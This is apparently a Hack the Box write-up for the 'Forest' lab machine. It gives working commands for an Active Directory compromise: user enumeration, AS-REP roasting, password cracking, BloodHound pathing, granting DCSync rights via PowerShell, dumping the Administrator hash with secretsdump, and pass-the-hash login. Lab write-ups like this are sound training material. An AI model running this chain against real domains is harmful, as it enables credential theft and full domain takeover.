---
layout: post
title: Hack the Box - Forest
author: Kolja
categories: [HtB]
tags: [ad]
---

Forest is an easy machine from HtB and part of the  Active Directory 101 path, which is why I took a look at it.

## Enumeration
I started with enumeration. A neat thing, that worked on this box was enumerating users with `rpcclient`:
```
└─$ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> 
```
However this seems to be deprecated, so I am not sure if this will be useful in real-world engagements. After this, it is possible to get some hashes using AS-Rep-Roasting. I used impacket here:
```
└─$ impacket-GetNPUsers  -dc-ip 10.10.10.161 htb.local/ -usersfile  tmp.txt -format john -outputfile hashes -no-pass
```

We can then use the `rockyou`  list to crack the password of the `svc-alfresco` user: 
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:05 DONE (2022-05-20 15:48) 0.1865g/s 762268p/s 762268c/s 762268C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably

```

Here I then used the python ingestor for `BloodHound`, which was was also neat:
```
└─$ bloodhound-python -c All -u svc-alfresco@htb.local -p s3rvice -ns 10.10.10.161 -d htb.local -dc forest.htb.local 
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: forest.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: forest.htb.local
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 01M 27S
```

One of the paths shows, that our user can use PowerShell Remoting to access a DC:

![First attack path](/assets/htb_forest_attack_path_one.png)

I had some trouble connecting with `evil-winrm` initially, which was fixed after resetting the lab:
```
evil-winrm  -u svc-alfresco -p s3rvice -i 10.10.10.161
```

I did not find a local privilege escalation vector on the box. But our user has other attack paths. One of them leads to the domain:

![Second attack path](/assets/htb_forest_attack_path_two.png)

Here we first add ourselves to the `Exchange Windows Permissions`-Group and then give ourselves permission to use DCSync. I had some trouble getting the abuse info for the second step to work, but adding the `-PrinvipalIdentity`-Argument fixed this for me (likely because we need a new login session, after adding us to the group). We also needed to do the steps in a limited time frame, as there is some cleanup logic (probably to not ruin the box for people attacking it afterwards). I solved this by copy-pasting them as one line: 
```
Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco' -Credential $Cred ; $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force ; $Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword); Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'DC=htb,DC=local' -Rights DCSync
```
We can then use `impacket` to get the NTLM hash of the `Administrator` account:
```
impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
Afterward, we can log in using `evil-winrm` again:
```
└─$ evil-winrm -i 10.10.10.161 -u Administrator -H "32693b11e6aa90eb43d32c72a07ceea6"

```
